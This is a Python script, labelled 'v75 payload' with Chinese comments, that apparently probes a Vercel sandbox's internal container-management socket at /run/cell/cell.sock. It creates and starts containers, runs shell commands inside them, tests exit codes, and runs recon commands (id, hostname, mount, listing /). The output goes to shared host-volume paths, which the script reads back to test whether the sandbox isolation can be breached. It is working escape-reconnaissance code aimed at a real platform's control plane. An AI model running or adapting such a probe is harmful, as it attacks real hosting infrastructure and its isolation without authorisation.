# -*- coding: utf-8 -*-
"""v75 payload: Wait 验证 Exec 进程生命周期 (退出码) + 多位置文件副作用"""
import socket, time, os, json

OUT = '/vercel/sandbox/v75c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v75c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def main():
    log('V75 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V75C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # 1) Wait 基线: 未 Exec 时 Wait
    st, bd = rpc(CTR + '/Wait', '{"containerId":"%s"}' % cid, t=5)
    log('wait-baseline -> %s | %s' % (st, bd[:200]))

    # 2) Exec A: sleep 3 + exit 42; 立即 Wait
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'sleep 3; exit 42'])
    log('execA -> %s | %s' % (st, bd[:150]))
    t0 = time.time()
    st, bd = rpc(CTR + '/Wait', '{"containerId":"%s"}' % cid, t=8)
    log('waitA (%.1fs) -> %s | %s' % (time.time() - t0, st, bd[:250]))

    # 3) Exec B: exit 7; Wait
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'exit 7'])
    log('execB -> %s | %s' % (st, bd[:150]))
    t0 = time.time()
    st, bd = rpc(CTR + '/Wait', '{"containerId":"%s"}' % cid, t=8)
    log('waitB (%.1fs) -> %s | %s' % (time.time() - t0, st, bd[:250]))

    # 4) Exec C: 文件副作用 (mkdir 后写多个位置)
    cmdC = ('mkdir -p /run/vercel/share /vercel/sandbox /tmp 2>/dev/null; '
            'echo C1 > /run/vercel/share/exec_test2 2>&1; '
            'echo C2 > /vercel/sandbox/exec_test3 2>&1; '
            'echo C3 > /tmp/exec_test4 2>&1; '
            'hostname > /run/vercel/share/hn.txt 2>&1; '
            'id > /run/vercel/share/id.txt 2>&1; '
            'mount > /run/vercel/share/mount.txt 2>&1; '
            'ls -la / > /run/vercel/share/rootls.txt 2>&1; '
            'echo DONE')
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmdC], t=8)
    log('execC -> %s | %s' % (st, bd[:150]))

    # 5) 轮询所有副作用位置
    t_wait = 0
    paths = ['/run/vercel/share/exec_test2', '/run/vercel/share/hn.txt', '/run/vercel/share/id.txt',
             '/run/vercel/share/mount.txt', '/run/vercel/share/rootls.txt',
             '/vercel/sandbox/exec_test3', '/mnt/h/volumes/run/vercel/share/exec_test2',
             '/mnt/h/volumes/run/vercel/share/hn.txt']
    while t_wait < 15:
        time.sleep(1)
        t_wait += 1
        for p in paths:
            try:
                if os.path.exists(p) and os.path.getsize(p) > 0:
                    cur = open(p, errors='replace').read()
                    log('--- %s ---\n%s' % (p, cur[:4000]))
            except Exception:
                pass

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V75C_DONE')


main()
